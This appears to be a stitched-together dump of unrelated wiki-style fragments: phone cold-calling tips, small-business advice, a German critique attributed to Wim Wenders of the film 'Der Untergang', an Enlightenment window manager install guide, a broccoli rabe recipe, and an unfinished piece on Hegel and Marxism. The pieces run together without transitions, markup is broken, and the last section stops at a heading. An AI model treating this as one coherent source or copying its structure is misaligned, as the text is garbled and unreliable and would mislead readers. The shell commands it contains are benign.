You may not realize it, but the position of your body influences how your mind works, what hormones are flowing through your veins, and ultimately, how others perceive you. This is true when you talk with someone face to face as well as over the phone. The reason is that your physical state affects your mental state: your thinking, your attitude, and your voice. Remember that your voice is your only tool to communicate your ideas over the telephone. How can you prepare your body? Make the call sitting down in a chair and leaning slightly forward. This puts you in a state for a positive attitude. Then smile. The person on the other end of the line will be able to hear it.
Making the call: Be brief, be polite
When you are duly prepared, pick up the phone and dial. Identify yourself confidently by name and ask if the person has a moment to take your call. It is possible that the person is in a meeting or is otherwise unable to talk with you at the moment, even if they answered your call. Be considerate and allow them to end the call immediately if needed. 

Remember to be as brief as possible when calling. Your goal is not to chat up anyone, but rather establish contact and a specific time to meet. The person you are calling is a busy professional who would much rather be doing something productive than chewing the fat with strangers cold-calling them on the phone.

== Ending the call: Finish with definite goals &amp; confirm information ==
The end of the call is a time to be very concrete and confirm the next steps that you will take. Ideally this will mean an appointment to meet with the person you called. If the person is too busy to speak with you , set a specific time for you to call them back, for example five minutes, an hour, two days. If the time is excessively large, this is a clear signal that the person really has little interest in speaking with you. If you have set up an appointment, repeat the time and date, so there is no confusion. 

When you say goodbye, do so quickly and confidently, thank the person for their time and repeat your name. It is possible that even in a short call the person has forgotten your name, and repeating it helps avoid awkwardness, and helps assure that they will remember it next time as well.

      <text xml:space="preserve">== Don't go for what looks easy or flashy ==
Do something that you know well, where you have experience and are an expert. You should thoroughly understand all of the issues related to the activity.

Sometimes people can be tempted to do something that looks simple to start and deal with. The fact is that in any activity that you can imagine there are many things that are impossible to predict until they come up:

a)	Certain unexpected situations&lt;br&gt;
b)	Once in the situation, how to deal with it

You will need to plan to be effective, and you can´t plan what you don´t know. You can react to the unexpected but usually, that is an easy way to get in trouble.


== Start slowly ==
In the beginning of your business try, if you can, to deal with it as a side-line, so you are not depending on it for an income. That way you will only risk time, effort and maybe little money as you begin to test your idea in the real world, and learn a lot from it.

If things are going well pehaps it is the moment to move forward and be very conscious of the consecuences of your decisions. That will help you a lot in the future, when you will have to make decisions that may imply risks. Experience is the most powerful tool that  you can rely on in this situation. 

A gradual transition will allow you to think, plan, execute without risk and see and work on potential problems that perhaps you woulden´t realize from the beginning.

== Build your network ==
Relations will help you in the beginning of your operations, and in countries like Mexico contacts are the main source of opportunities to make business.

There are many methods to develop a business network, and it depends on your capability to invest some money to obtain results. In the beginning the best practice is to establish contacts on a one-to-one basis. This means that you should approach your contacts to offer them some benefits if they are able to offer you potential business opportunities. This doesn´t mean an attempt to bribe them (at least not necesarily), but instead you can offer your complete help to obtain results oriented to their positioning in their field of action. An example of this is to offer your organization as manpower to solve some of their concerns without any additional charge if in exchange you can get the opportunity to show your abilities and results. It is very good to develop a “partnership” relation with people that know you and is aware of your efforts to create your company.

Another way to do this, but much more expensive is to organize (and therefore to pay for) some events (business breakfast, perhaps) in which you will have the opportunity to present your products or services, and after your presentation provide some brochures to the audience, and most important, to collect data from them in order to establish further contact on one to one basis again, to work on those issues that have interested them more.

Those things mentioned above would allow you to keep in contact with the people that can provide you business opportunities. For instance, once you have identified a group of executives that would represent a solid network, you can invite them to some periodic events in which they will have opportunity to keep contact among themselves (to establish their own network), and also receive information about topics that should be very interesting for them in their activity (products or services presentations, some recognized speaker... etc.). Doing that three times a year will provide you reasons to be in contact with them and take advantage of that  to expect the chance to be in the right place in the right moment.


== Expect the unexpected ==
Reality will show you all those things that you didn´t consider in your previous planning activity. Yes, shit happens, and Murphy is relentless. Be prepared and deal with it, whatever,  without hessitation and tune up your reaction abilities. That will protect you until you get the experience to know in advance what will happen according to the signs that always appear to trained eye.

Warum darf man Hitler in »Der Untergang« nicht sterben sehen? Kritische Anmerkungen zu einem Film ohne Haltung

Von Wim Wenders
  
 
 Vorgeschichte: In aller Herrgottsfrühe am Montag, dem 20. September, in Frankfurt gelandet. Durch den Regen nur die Lichter auf der Autobahn zu sehen. Dann müde Gesichter in den Gängen und auf den Rolltreppen. Die übliche mürrische Passkontrolle. Schließlich auch Zeitungen. Und beim Warten auf den Anschlussflug als erste Neuigkeit aus Deutschland: In Sachsen hat die NPD gerade fast zehn Prozent der Wählerstimmen erhalten. Aber in keiner der ausliegenden deutschen Zeitungen irgendein Bild, das zu dieser Partei oder ihren Repräsentanten gehören würde. Erst auf der Titelseite der Financial Times (klar, mit Zeigefinger!) dann ein Konterfei von einem »Herrn Apfel«, der sich da triumphierend durch eine Menschenmenge schiebt. War es richtiger, so einen Mann nicht zu zeigen? 

Später, im Taxi. »Haben gewählt, sind selber schuld!«, sagt der Fahrer. Im Radio gratulieren alle Politiker ihren Parteien zum Sieg und echauffieren sich anschließend pflichtgemäß über die rechte Pest. Ich sehe das anders. Zumindest weiß man hierzulande, woran man ist. Jeder Zehnte in Sachsen hat also irgendwie die Schnauze voll und blickt nicht mehr durch. Auch zur Wahl der Antidemokraten hat er das Recht. Trotzdem, nein, gerade deswegen bestätigt mir mein »Heimatland« so seine demokratische Voraussetzung, auch wenn es gerade sehr um sein Selbstverständnis kämpft. In der amerikanischen »Wahlheimat«, aus der ich gerade komme, muss ich daran zweifeln, gerade weil man sich da der demokratischen Mission so (selbst)sicher ist. 

Später am Abend erst sieht man auch im Fernsehen die Rechten. Die feiern hinter verschlossenen Türen, aber ein Kameramann vom MDR hat wohl sein Mikro durch einen Fensterspalt geschoben. Man sieht die Rücken von ein paar Biertrinkern und hört eine heisere Stimme im Off: »Wir sind keine Partei wie alle anderen Parteien. Wir sind gegen alle anderen Parteien. Und wir wollen auch mit niemandem zusammenarbeiten, um das System zu verbessern. Wir wollen das System abschaffen.« Oder so ähnlich. Das Ende ging in grölendem Beifall unter. Da sitze ich also, mit meinem amerikanischen Hochverdruss und meinem deutschen Willkommensgruß. 

Was tun, wenn man so lange weg war, wenn nicht ins Kino gehen und nachholen? Habe ja viel verpasst. Vor allem den deutschen Start des »Hitler-Films«, von dem ich in der Ferne nur gelesen habe. Der Untergang, denke ich, wird also der große deutsche Film über das Ende des Nationalsozialismus sein, über das Ende der Herrschaft faschistischer Ideen in diesem Land. Gerade das Richtige, zum richtigen Zeitpunkt. Ich geh also rein.

Nach dem Kinobesuch ein tiefes Erschrecken über etwas, was ich nur »Verharmlosung« nennen kann. Ich schreibe mir meine Eindrücke in einer langen Nacht von der Seele, kann wegen meines Jet-Lags ohnehin nicht schlafen. Aber in den Tagen darauf zögere ich, den Text zu veröffentlichen. Die ganze Sache scheint ja auch schon zur Genüge diskutiert worden zu sein. Warum also auch noch meinen Senf dazugeben? 

Zeit vergeht. Ich rede mit Leuten. Viele sind »beeindruckt«, andere nicht, wissen aber nicht recht, warum. Mein Unbehagen angesichts des Untergangs wächst, wird zu Ärger. Ich halte mitten in anderer Arbeit inne, um Dinge aufzuschreiben, die mir nachträglich erst klarer werden. Ich lese das eine oder andere nach, was so gesagt und geschrieben worden ist, und in mir kocht es über. Ich will überprüfen, was mir da so auf den Geist gegangen ist. Vielleicht habe ich mich ja auch getäuscht…


Geschichte: Bei mir um die Ecke wirbt ein großes Plakat für einen Film namens Resident Evil. Ich radle jeden Tag daran vorbei. Hat nicht dieses »Einheimische Böse« irgendwas mit meinem Zorn zu tun, denke ich, wäre »Das Übel, das bei uns wohnt« nicht auch ein Titel, eine Art Metapher für den Faschismus? Unsere Zukunft liegt in ihren Händen steht da auch noch als Unterzeile. Ich beschließe, beide Filme hintereinander anzuschauen. Sie laufen im selben Cineplex.

Es ist nicht ungefährlich, heute ins Kino zu gehen. Was mir da Gruseliges um die Ohren fliegt, als ich im dunklen Saal meinen Platz suche, ist, so stellt sich raus, bloß der Vorfilm zum neuen Exorzisten. Aber dann kommt es noch viel ärger, der Trailer zu Alien versus Predator nämlich, und da fühle ich mich schon arg gebeutelt. Warum muss man so einen hohen Preis zahlen, bevor man einen Film sehen kann? Dann der Vorfilm für The Forgotten, in dem es offensichtlich darum geht, dass man Menschenleben ungeschehen machen kann. Menschen sterben, aber so, als hätten sie nie gelebt. Sie lösen sich in nichts auf, mitsamt ihrer Geschichte. Mir wird erst jetzt, beim Schreiben, plötzlich klar, wie ich da auf die Begegnung mit Hitler vorbereitet worden bin, ohne dass ich’s gemerkt und sicherlich auch ohne dass das jemand so gewollt hätte, außer dass es eben die heutige »Kinolandschaft« so will.


In diese Landschaft hinein hat ein deutscher Produzent zwei Filme gesetzt, Bernd Eichinger nämlich, auf den ich große Stücke halte. Er zeichnet auch als Executive Producer für Resident Evil, der laut der Branchenzeitschrift Variety in den USA höchst erfolgreich ist, während Der Untergang hierzulande die Kinos füllt. Eichingers Erfolg freut mich im Prinzip erst einmal. 

Während Resident Evil in der Zukunft spielt, liegt Der Untergang, wie jeder weiß, knapp 60 Jahre weit zurück. Beide laufen aber jetzt, in der Gegenwart, wo ich im Sony-Center in Berlin sitze, in der Stadt, die man in dem einen Film untergehen sieht und die im anderen durchaus der fiktiven Stadt »Raccoon« ähnelt. Resident Evil hätte jedenfalls durchaus ein relevanter Film über den Faschismus werden können, was er womöglich auch ansatzweise ist. Es geht darin um ein weltbeherrschendes Imperium, um Biowaffen und Gehirnwäsche und darum, dass Tote wieder auferstehen und die Lebenden auffressen. Eine Frau namens Alice (Milla Jovovich), halb geklont, aber das Herz auf dem rechten Fleck, hilft höchst heroisch den wehrlosen Menschen, sich sowohl gegen die toten Zombies als auch gegen die böse Corporation zu behaupten. Deren biogenetische Experimente zielen auf die Schaffung einer idealen Menschenrasse, aber ein Fehler im Programm hat wohl die Toten auf den Weg gebracht. So viel hanebüchenen Schwachsinn zusammenzufassen fällt einem echt schwer. Ein Machwerk, will man’s schnell abtun und zum Werk übergehen, das Der Untergang dagegen wohl ist, wenn nicht ein »Meisterwerk«, wie so oft zu lesen war. Ich sehe den Film also ein zweites Mal. Worum es mir dabei vor allem geht, ist, herauszufinden, welche erzählerische Position er eigentlich vertritt. Zu dieser Frage hatten sich meine Zweifel und zuletzt mein Zorn zugespitzt. 

Ich muss kurz einschieben, dass ich eine Vorgeschichte zu dem Thema habe. Vor 27 Jahren habe ich, ebenfalls in der ZEIT, das einzige Mal mit Wut im Bauch über einen Film geschrieben, über den Hitler-Film ebenjenes Professors Joachim C. Fest nämlich, dessen Vorlage diesmal zum Untergang geführt hat. Sein damaliger Film war zwar ein »Dokumentarfilm« gewesen, der aber den in meiner Sicht unverzeihlichen Fehler begangen hatte, zu glauben, dass man aus Nazibildern und Propagandamaterial nur durch den bloßen Kommentar einen »umgepolten«, distanzierten Film machen könnte. Ich habe darin damals eine bodenlose Arroganz gesehen oder zumindest ein völliges Missverständnis dessen, was Kino kann und was es nicht kann. Die Kraft dieser infektiösen Bilder war jedenfalls einfach stärker als die dagegen schwächliche Stimme des Historikers, dessen »Erzählhaltung« mir zudem noch äußerst dubios erschien. 

Nun hat der kluge Mann also ein Buch über die letzten zwölf Tage des »Dritten Reiches« geschrieben, das zum Film Der Untergang geführt hat. Eine weitere Quelle, wie man zur Genüge weiß, waren die Aufzeichnungen von Hitlers letzter Sekretärin Traudl Junge. Die Kompetenz des Geschichtsprofessors, gepaart mit der Authentizität der Zeitgenossin, das kann ja nur zu einem großen Wahrheitsanspruch führen. Und mit ebendiesem tritt der Film auch an. »Wir wissen, wovon wir reden!«

Aber wenn man etwas erzählen will, reicht es nicht, zu wissen, wovon man erzählt, dann muss man auch dazu stehen, wie und aus welcher Sicht man es erzählt. Die letzten beiden Fragen hat man sich beim Machen dieses Films auf verheerende Weise nicht gestellt, oder, noch schlimmer, man ist ihnen vielleicht sogar bewusst ausgewichen.


Betrachten Sie nur den Anfang. Ein Mann sucht eine Sekretärin, und nicht nur irgendwer, nein »der Führer« höchstpersönlich! Die Kandidatinnen kommen bei Nacht und Nebel an, klar, es ist Krieg, sitzen dann in einer Reihe im Warteraum und sind aufgeregt. Alle schauen sie schließlich auf die sich öffnende Tür (und wir im Publikum mit ihnen), und dann tritt, höchst kinowirksam aufgebaut, Hitler auf. Da ist er! Der Mann ist ungemein freundlich und umgänglich, interessiert sich eigentlich nur dafür, woher die Damen alle kommen, und wählt schließlich die hübscheste aus, die (natürlich) aus München kommt. Er bittet zum Diktat, »tja, dann wollen wir mal«. Gnädig verzeiht er ihr, dass sie wohl nicht so gut tippen kann. Bald darauf kommt Fräulein Junge (anscheinend niedergedrückt, hat sie nicht gerade alles verpatzt?) aus seinem Zimmer, alle anderen schauen sie gespannt an, und: Sie verkündet freudestrahlend, dass sie den Job hat. Die Mitbewerberinnen freuen sich mit ihr und fallen ihr um den Hals, und der heutige Kinobesucher auch. Der hat sich gerade, ob er will oder nicht, mit der netten und liebenswerten Traudl identifiziert. Und wird das die nächsten zwei Stunden über so tun. In Der Untergang sieht man vieles aus ihrer Sicht. Es ist die Perspektive einer unschuldigen jungen Person, die in Nürnberg ebendeshalb wohl freigesprochen worden wäre. Daran wäre auch eigentlich nichts auszusetzen. Aber in seinem letzten Satz, von der erwachsenen echten Frau Junge gesprochen, wird sich der Film von dieser naiven Sicht distanzieren, weil es nämlich »keine Entschuldigung ist, dass man jung ist, dass man auch Dinge hätte erfahren können«. Sie sagt sogar: »Es fällt mir schwer, mir das zu verzeihen.« 

Aber teilt der Film diese Einsicht, und wie teilt er diesen Sinneswandel mit? Er erzählt ausschließlich aus der naiven Sicht der jungen Traudl, die Reflexion der alten Frau Junge hängt er nur kurz hintendran. Selbst daran wäre womöglich nichts auszusetzen, wenn Der Untergang »ihr Film« geworden wäre. Aber genau das ist er nicht. Er ist ja auch noch der Film des Geschichtsprofessors, aus dessen Sicht wir einige andere Szenen des Films sehen, bei denen Traudl nicht dabei sein darf. In diesen Szenen treten all die Herrschaften des Naziregimes auf, dass einem nur so der Kopf schwirrt (gut, dass es auf der Web-Seite das »Who is who des Führerbunkers« gibt). Es kommen die Schlachtpläne auf den Tisch, es werden Lageberichte zitiert. Es sind Szenen, die sich als Sprachrohr der »Geschichte« geben, in denen ein unerbittliches »So war es und nicht anders!« mitschwingt, eben die Sicht des Herrn Fest. Der muss es ja wissen, der hat ja das Buch geschrieben. 

Gegen dieses Buch gibt es auch nichts einzuwenden. Es reiht sich ein in Tausende anderer Bücher über das »Dritte Reich«. Es trägt die Handschrift des Historikers. Aber die lässt sich nicht so einfach von Buchseiten auf Filmbilder transportieren. Bilder nämlich brauchen einen eindeutigen point of view, eine Haltung, die Der Untergang lediglich simuliert. Neben der Verhackstückung von Frau Junge und dem daraus resultierenden hybriden Blick gibt es durchaus noch weitere Erzählperspektiven. Etwa die Erlebnisse des kleinen Hitlerjungen, der vom Führer höchstpersönlich mit dem Eisernen Kreuz dekoriert wird, weil er zwei russische Panzer aufgehalten hat. »Also Peter heißt du. Ich wollte, meine Generäle hätten deinen Mut.« Man folgt dem Jungen durch den Horror der belagerten Stadt, in der die Bomben nur so durch die Gegend fliegen und die Menschen vor unseren Augen zerfetzt werden. Da treiben sich SS-Henkertrupps herum, wird Peters Vater gehängt und seine Mutter abgeschlachtet. Und ebenjener blonde deutsche Bub rettet dann am Schluss auch die Traudl. Ja, man glaubt seinen Augen kaum, da kommt er aus dem Nichts und greift ihre Hand und führt sie durch die russischen Soldaten ins Freie, weil die ja einer Mutter mit Kind nichts tun. Wer erzählt denn nun? Ein Märchenonkel? Sicher weder Frau Junge noch Herr Fest. Ist hier nicht einfach nur »das Kino« am Werk? 


Wie könnte ich das Fehlen einer Erzählhaltung anders begründen als mit dem schlimmsten Schnitzer, den dieser Film macht? Während nämlich dauernd Arme und Beine abgesägt werden, während Hunderte von Soldaten abgeschlachtet werden, während sich die Generalität die Kugel gibt und man die Leichen mit den Einschusslöchern herumfallen sieht und ein junger Volksstürmer seine Freundin erschießt und dann sich selbst, während all das ausgiebig gezeigt wird, beweist der Film dann doch zweimal ausgesprochene Pietät. Hitler bittet seinen Adjutanten Wünsche, er möge Benzin besorgen, »damit die Russen meine Leiche nicht zur Schau stellen können«. »Ein schrecklicher Befehl, aber ich will ihn ausführen«, entgegnet der Untergebene. Und was tut der Film? Er führt Hitlers Befehl tatsächlich aus! Alles sieht man in Der Untergang, nur Hitlers Tod nicht! Der Mann gibt sich (und seiner Eva) hinter verschlossener Tür das Gift und die Kugel. So wie Hitler sich abwendet, wenn seine Schäferhündin Blondie stirbt, so wendet sich der Film ab, wenn der Führer stirbt. Traudl schmiert den Goebbels-Kindern Butterbrote, da ertönt ein Schuss. »Volltreffer!«, ruft der älteste Junge erfreut. Dann öffnen sie alle die Tür und gucken. Aber wir, die Heutigen, sehen nicht, was sie sehen. Alle schauen erschaudernd und trauernd beiseite. »Herr Reichsleiter, es ist passiert!« – »Es«, sagt der Mann, als ob es das Unvorstellbare wäre. »Ich melde, der Führer ist tot.« In diesem Film hätte das keine Meldung sein dürfen. Warum auf einmal dieses dezente Nichtzeigen, warum die plötzliche Prüderie? Warum, verflucht noch mal!? Warum nicht zeigen, dass das Schwein endlich tot ist? Warum dem Mann diese Ehre erweisen, die der Film sonst keinem von denen erweist, die da reihenweise sterben müssen?

Keinem? Oh, doch! Noch einer wird auf diese Weise ausgeblendet. Wenn Goebbels wie im Western-Duell vor seiner Frau steht und die Pistole hebt, wendet sich die Kamera noch einmal vornehm ab. Sonst wird in diesem Film nie weggeschwenkt! Eine halbe Minute später hat der Film nichts dagegen, wenn Schädle sich das Gehirn aus der Birne bläst, dass es nur so gegen die Wand spritzt. Tausend Leichen sieht man, nur den Führer kriegen wir nicht tot zu Gesicht. In Decken wird er rausgezerrt und in eine Grube geworfen. Wenn dann Benzin über seine Leiche gegossen wird, kommt dieser Schnitt, der mir heute noch wehtut.

Ja, da folgt dem Ausgießen des Benzins, von der Nahaufnahme des Kanisters – »gluck, gluck, gluck« macht es laut – tatsächlich ein Schnitt auf eine Nahaufnahme von Traudls Asbach-Uralt-Flasche, »gluck, gluck« macht es wieder, und sie trinkt sich Mut an, um nun endlich abzuhauen. »Das darf doch nicht wahr sein«, habe ich bloß gedacht. Aber er war leider wahr, dieser unsäglich dumme Schnitt.

Welchen Erzähler entlarvt er hier? Wessen Sicht transportiert dieser Film? Warum dürfen wir Hitler und Goebbels nicht sterben sehen? Werden sie durch das Nichtzeigen nicht erst recht zu mythischen Figuren? Warum verdienen sie einen so würdigen Abgang, während alle anderen guten und schlechten Deutschen abgeknallt werden? Was für ein Verdrängungsvorgang entspinnt sich da vor unseren Augen? Oder kriegen wir diese Szenen später nachgeliefert, als Zusatzmaterial auf der DVD? 

In Resident Evil geschieht das Richtige: Da wird den Zombies am Ende der große Manipulator zum Fraß vorgeworfen. Hier wird zumindest die Geschichte bedient. Nicht die mit einem großen »G«, aber die des Kintopps.

Der Untergang bedient weder das große noch das kleine »G«. Der Film hat von allem keine Meinung, vor allem nicht vom Faschismus oder von Hitler. Er überlässt den Zuschauern die Haltung, die er selbst nicht hat oder höchstens vortäuscht. Das Machwerk Resident Evil lässt den Faschismus am Ende als latente Gefahr weiterleben, mit dem Unbehagen nämlich, dass das »Einheimische Böse« womöglich doch schon eine weltumspannende faschistische Corporation geworden ist. Ja, es erlaubt sich sogar noch die Ironie, im Endtitel nämlich, uns die gruselige Vorstellung nahezulegen, dass diese Macht uns, das heutige Publikum, beherrsche. Das Untergangs-Werk dagegen entlässt uns zur Sonne, zur Freiheit. Als die beiden überlebenden deutschen Helden am Ende in die Freiheit radeln, geht tatsächlich die Kunstlicht-Sonne auf über Traudl und Peterle, dem Hitlerjungen. Und was in den Schlusstiteln geschieht, spottet dann jeder Beschreibung. Sie beginnen mit dem Datum der Kapitulation, klären uns dann auf über die sechs Millionen Juden, von denen der Film nicht gehandelt hat, nicht handeln wollte oder konnte, und führt dann, unterlegt mit derselben Musik, die alles einebnet, auch über zu den Privatschicksalen aller Menschen und Unmenschen, denen wir für einen Zeitraum von zwölf Tagen haben zuschauen dürfen. Himmler und Göring haben dieselben Tafeln wie alle anderen Kriegsverbrecher, wie die netten Menschen, Traudls und Peterles und Millionen Namenlosen, und so finden sich Verführer und Opfer zum Schluss noch einmal in der beliebigen Haltungslosigkeit vereint, die diesen Film so unglaublich ärgerlich macht. Allein der Mangel an Erzählhaltung führt die Zuschauer in ein schwarzes Loch, in dem sie auf (beinahe) unmerkliche Weise dazu gebracht werden, diese Zeit doch irgendwie aus der Sicht der Täter zu sehen, zumindest mit einem wohlwollenden Verständnis für sie.

PS: Auf einer Website zu dem Film lese ich in einem Interview mit Fest auf die Frage »Welche Resonanz erwarten Sie auf den Film?« folgende Antwort: »Die Resonanz auf das Buch war sehr gut. Was ich mir für den Film verspreche, weiß ich nicht. Ich fürchte, irgendjemand wird sagen, das ist wieder diese unerlaubte Heroisierung, die moralischen Aspekte kommen zu kurz… Hat der Fest oder Eichinger keinen Zeigefinger, den er erheben kann? Das sind die blödesten Kritiken, die ganz bestimmt kommen werden. Ich habe diesen Zeigefinger tatsächlich nicht. Wer diesen Film auch nur halbwegs aufmerksam verfolgt, wird merken, welche Lehre diese Darstellung enthält. Wenn er das nicht merkt, kann ich ihm auch nicht helfen, dann wird auch der erhobene Zeigefinger ihm nicht helfen. Aber vielleicht enttäuscht mich das deutsche Publikum mal positiv und überrascht mich…«

Ich fürchte, ich bin hier derjenige, welcher. Nur kreide ich ihm den fehlenden Zeigefinger anders an, als er denkt. Nicht »moralisch«, sondern »erzählerisch« hätte der Film uns andere Fingerzeige geben müssen. 

Von Charlie Chaplin weiß man, dass er im Nachhinein Zweifel an Der Große Diktator hatte, weil er die Ungeheuerlichkeit Hitlers noch nicht in aller Konsequenz hatte ahnen können, als er ihn 1942 verulkte. Den deutschen Filmemachern Eichinger und Fest hätten die Zweifel kommen müssen, ob sie Hitler nicht auch verharmlost haben, indem sie 4500 Tage deutscher Geschichte mit ihm, seinen Ideen und seinen Taten ausgespart und uns nur das kommerzielle Sahnehäubchen seiner morbiden letzten Tage aufgetischt haben. Zum Gruseln haben sie uns damit gebracht. Aber das kann auch Resident Evil. Unser »einheimisches Böses« hätte einen anderen Erzählstandpunkt gebraucht als den des landläufigen Kinos.

==enlightenment installation guide==

Installing Enlightenment 0.17 (also known as E17 or DR17) is a snap in suse. You just use YAST and it is all done for you. After the progress bar is finished you then log out. When you look at the sessions available at the login screen, Enlightenment is now available.  How you get to yast and all the other programs through enlightenment, I don't know!

There is a quickstart guide for E17 in Suse at http://archive.is/20121225190143/arun.wordpress.com/2006/06/15/how-to-enlightenment-17-in-suse-10/

A HOWTO for Gentoo can be found at http://en.gentoo-wiki.com/wiki/E17

Check out the following link to install DR17 in Suse Linux :
http://www.novell.com/coolsolutions/feature/16231.html

There are no up-to-date official binaries for E17 for Debian- or Ubuntu-based distributions.  Packages labeled &quot;e17&quot; in the Ubuntu repositories are actually e16 and are dated December 2004.  &lt;!-- Directions for accessing the latest unofficial .deb packages for Debian are here: 
http://wiki.enlightenment.org/index.php/E17_User_Guide/Installing_using_Linux_distribution_packages#Debian_GNU.2FLinux
and for Ubuntu here: 
http://wiki.enlightenment.org/index.php/E17_User_Guide/Installing_using_Linux_distribution_packages#Ubuntu_Linux --&gt;

=== Installing e from a terminal ===
 
open a terminal and become root, or su, or sudo 

in mine, (Mandriva 2008, running Eterm)

  '''[root@localhost ~]#''' ''apt-get install enlightenment''

or
 ''' [root@localhost ~]#''' ''yum install enlightenment''

or 
 ''' [root@localhost ~]#''' ''urpmi enlightenment''

one of these should install enlightenment if you are already connected.

==enlightenment DR16 configuration guide==

Enlightenment is extremely configurable - that is you can alter or re-design almost any feature of the window manager. The only downside is that to get a really cool environment, you have to do the work. Or download a theme someone else has done for you.


===Getting Background images to change from middle click menu-in .e16'''===

using a terminal (i prefer ''Eterm'')
you should see 

 '''[yourloginname@localhost ~]$'''''su'' &lt;enter&gt; 
 '''password''' &lt;your root password- type it in, &lt;enter&gt;&gt;
now, your terminal will look like

 '''[root@localhost yun]#''' 
now we are root.


 '''[root@localhost yun]#''''' ls -a''

see a report of folders, etc., you need to see &quot;.e16&quot; so you can change into that directory

 '''[root@localhost yun]#''' ''cd .e16''


notice we will leave our ''yun'' directory and are now in .e16- (below) lets add a folder for images 


 '''[root@localhost .e16]#''''' mkdir /backgrounds''


now, we can &quot;''cd''&quot; into /backgrounds, and see all the files in there (now, there's none, but this is where you want background images to be for the middle menu button, 
if you want to download them directly into this directory, choose to save image into the same path, '''''yun''' &gt; .'''e16''' &gt; '''backgrounds''' &lt;''save''&gt;''

***note***- sometimes the &quot;background&quot; menu dissapears, to restore it on the fly, 
 '''-middle click &gt; maintenance &gt; purge all caches''' ''*OR*'' '''regenerate menus''' 
now, to test your new backgrounds from the middle click menu
  '''middle click &gt; Desktop &gt; backgrounds''' 
= your backgrounds are now tiny images to help you select, on the fly swapping, select any of the small image icons, and watch your background flip instantly (ensure proper dimensions on image, like 1200x720 )

=== staying in .e16  other menu/ simple config===

You should by now have a folder titled &quot;.e16&quot; in your home directory.
This is the configuration point for enlightenment.

It has a layout as follows:

backgrounds/
cached/
e_config--0.0.backgrounds
e_config--0.0.buttons
e_config--0.0.cfg
e_config--0.0.ibox
e_config--0.0.snapshots
icons/
menus/
themes/

Let's start with menus
Left click anywhere on the desktop, and up comes a menu titled &quot;User Menus&quot;
Straight off this is the &quot;User Application List&quot;!1. This is a list of commands that can be configured by you to run as children of the process running enlightenment.

On my installation (Mint 9 Julia) &quot;User Application List&quot; did not appear, though user_apps.menu existed and had entries.  I had to change /usr/share/e16/config/menus/enlightenment.menu where I changed the line 
'&quot;User Menus&quot;           NULL menu file.menu'
to read
'&quot;User Menus&quot;            NULL menu user_apps.menu'
Then the entries showed as a menu straight off the &quot;User Menus&quot; list.

edit .e16/menus/user_apps.menu

Add the following line to the bottom

&quot;Clock&quot; NULL exec &quot;xclock&quot;

now save and try left-clicking again. You should see a menu option for the clock, selecting that option and you have just configured your desktop.

&lt;!--
Now, how do we make it really configurable.
added-
- want to change your bland background with .jpg images straight from a middle click menu ?
change directory into .e16
--&gt;

      <text xml:space="preserve">Sautéed Broccoli Rabe with Garlic &amp; Olive Oil

2 bunches broccoli rabe
                             
2 TB extra-virgin olive oil                         

4 medium garlic cloves, peeled and minced           

1/2 teaspoon crushed red pepper                     

freshly ground black pepper                         

salt to taste                                       

1.  Remove any tough or damaged outer leaves. Peel the thick, lower stems from the broccoli rabe, and tear the rabe into large pieces. Wash in cold water until all dirt is removed. 

2.  Blanch the broccoli rabe in several quarts of salted, boiling water, until bright green and leaves are tender, about 2 to 3 minutes. Remove from the hot water and immediately shock in ice water to stop the cooking process. Drain well and set aside.

3.  Meanwhile, heat the extra-virgin olive oil in a sauté pan over medium heat. Add the garlic and crushed red pepper. Sauté the garlic until brown. Add the broccoli rabe to the pan and toss to coat with the garlic/pepper mixture and heat through. Season to taste with salt and freshly ground black pepper, if desired.

Additional Broccoli Rabe Ideas

Add julienned red bell peppers to the pan with the garlic, and add pitted oil-cured black olives at the end for a colorful twist.

Add 3 anchovy fillets to the olive oil with the garlic for a classic beginning dish to Christmas Eve dinner in Napoli in Southern Italy.</text>

== Origins of Marxism ==

Lenin traces the roots of Marxism to German Philosophy, British Classical Economics, and French Socialism. Thus, it is best to look at these components in layman's English.

As a note, it is best to say Dialecticians rather than German philosophers influenced Marx and Engels. Hegel is the major player in both cases; he was &quot;the most encyclopedic&quot; of the dialecticians, and German philosophy &quot;culminated&quot; in the Hegelian System[1].

===Dialectics===

But what is &quot;dialectics&quot;? It is, more or less, a form of logic. It began with the Ancient Greeks as ''the'' logic. Literally, dialectic corresponds to &quot;discourse&quot; since the Greek dialectic was simply a discourse between a &quot;pro&quot; and &quot;con&quot; position on an issue. 

Hegel changed this, for Hegel had created the &quot;Modern&quot; dialectic. This note will be a step by step explanation of his method, so it may be a longer section than the others. Hegel believed the starting point is the immediately given experience at a particular historical juncture. This immediate experience is not &quot;apprehended&quot;. Thought must proceed from that which is initially given onwards.

Yet what is &quot;initially given&quot;? This brief moment is when Hegel, a philosopher who is an idealist, is empirical. Or, in other words, this is when Hegel looks at reality (empiricism) rather than ''only'' thinking about it. 

The goal is not to &quot;create&quot; the world out of pure thought processes, but to reconstruct the &quot;intelligibility&quot; (ability to apprehend by intellect only) of the world. This requires us to assign the fundemental categories that captures that intelligibility. 

Hegel writes: &quot;In order that this science (i.e. Hegel's own theory) may come into existence, we must have the progression from the individual and particular to the universal - ''an activity which is a reaction on the given material of empiricism in order to bring about its reconstruction. The demand of a priori knowledge, which seems to imply that the Idea should construct from itself, is thus a reconstruction only'' ... In consciousness it then adopts the attitude of having cut away the bridge from behind it; it appears to be free to launch forth in its ether only, and to develop without resistance to this medium; but it is another matter to attain to this ether and to development of it.&quot;

Now, what exactly is a &quot;category&quot;? Hegel explains that a category articulates a structure with two poles, a pole of unity and a pole of differences. From this general notion of a category we can go on to derive three general types of categorial structures.

In one the ''moment of unity'' is stressed, with the moment of differences implicit. In another the ''moment of difference'' is emphasised, with the moment of unity now being only implicit (or in other words the nature of the moment of unity is left undeveloped). In a third both ''unity and differences are made explicit together'', both are developed.

Another way of speaking of the connections is the concept of '''dialectical contradiction'''. Hegel's views on contradiction has been very controversial (to say the least). In terms of categories, what he means is fairly straightforward. If a category is a principle that unifies a manifold, then if a category ehibits only the moment of unity, then there is a &quot;contradiction&quot; between what is inherently ''qua'' is category (unifier of a manifold) and what it is explicitly (moment of unity alone). Overcoming the contradiction requires the intial category to be '''negated''' (in the sense that a second category must be formulated that makes the moment of difference explicit). Yet when this is done the moment of difference will be emphasized at the cost of having the moment of unity implicit. This means there is another contradiction. To overcome this the second category needs to be replaced with a category in which both poles, unity and difference, are each made explicit simultaneously.

Hegel is well aware of what contradiction and negation means in formal logic. He was following a tradition since Plato of using &quot;contradiction&quot; and &quot;negation&quot; as logical operators. The logic is ''dialectical logic''.

===British Classical Economics===

